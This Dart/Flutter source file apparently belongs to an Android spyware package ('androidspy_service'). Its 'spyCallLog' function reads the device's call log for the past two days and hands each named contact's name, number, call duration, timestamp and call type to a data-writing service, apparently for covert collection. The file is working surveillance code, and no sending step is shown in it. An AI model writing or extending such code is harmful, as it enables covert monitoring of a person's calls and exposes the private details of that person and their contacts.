import 'package:call_log/call_log.dart';
import 'dart:async';
import 'package:androidspy_service/services/writeData.dart';

void spyCallLog() {
  WriteData items = WriteData();

  Future<void> myCallLog() async {
    var now = DateTime.now();
    int from = now.subtract(Duration(days: 2)).millisecondsSinceEpoch;
    int to = now.subtract(Duration(days: 0)).millisecondsSinceEpoch;

    Iterable<CallLogEntry> entries = await CallLog.query(
      dateFrom: from,
      dateTo: to,
      durationFrom: 0,
      durationTo: 1000,
    );

    for (var call in entries) {
      if (call.name != null) {
        var data = {
          "Name": call.name,
          "Number": call.formattedNumber,
          "Duration": call.duration,
          "TimeStamp": call.timestamp,
          "CallType": call.callType.toString(),
        };
        //print("Caller: ${call.name}");
        items.addData("calls", data);
      } else {
        continue;
      }
    }
  }

  myCallLog();
}
